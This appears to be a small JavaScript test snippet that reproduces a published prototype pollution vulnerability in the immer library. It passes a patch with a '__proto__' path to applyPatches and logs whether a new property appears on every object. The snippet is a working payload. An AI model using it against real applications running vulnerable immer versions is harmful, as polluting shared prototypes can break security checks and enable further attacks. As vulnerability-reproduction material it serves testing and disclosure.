// //https://snyk.io/vuln/SNYK-JS-IMMER-1019369
// test("prototype pollution in immer", () => {
console.log({}.polluted);

  const { applyPatches, enablePatches } = require("immer");
  enablePatches();
  applyPatches({}, [
    { op: "add", path: ["__proto__", "polluted"], value: "yes" },
  ]);

console.log({}.polluted);
// });
